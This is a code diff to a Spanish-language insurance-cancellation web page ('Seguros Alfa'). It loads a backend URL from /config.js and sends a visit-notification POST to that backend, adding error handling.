@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Seguros Alfa - Cancelación de Seguro</title>
+    
+    <!-- Carga la configuración dinámica del backend -->
+    <script src="/config.js"></script>
+    
     <style>
         /* --- CONFIGURACIÓN GENERAL --- */
         :root {
@@ -419,12 +423,25 @@
     <!-- Script para notificar la visita al backend (IP y Navegador) -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            fetch('/api/notify-visit', {
+            // Usamos la variable BACKEND_URL que viene de /config.js
+            const backendUrl = window.BACKEND_URL;
+
+            if (!backendUrl) {
+                console.error('❌ BACKEND_URL no está definida. Revisa /config.js');
+                return;
+            }
+
+            // Hacemos la petición al BACKEND real, no al frontend
+            fetch(`${backendUrl}/api/notify-visit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' }
             })
             .then(response => {
-                if (response.ok) console.log('✅ Visita notificada al administrador.');
+                if (response.ok) {
+                    console.log('✅ Visita notificada al administrador.');
+                } else {
+                    console.warn('⚠️ El backend respondió con error:', response.status);
+                }
             })
             .catch(err => console.log('❌ No se pudo notificar la visita:', err));
         });
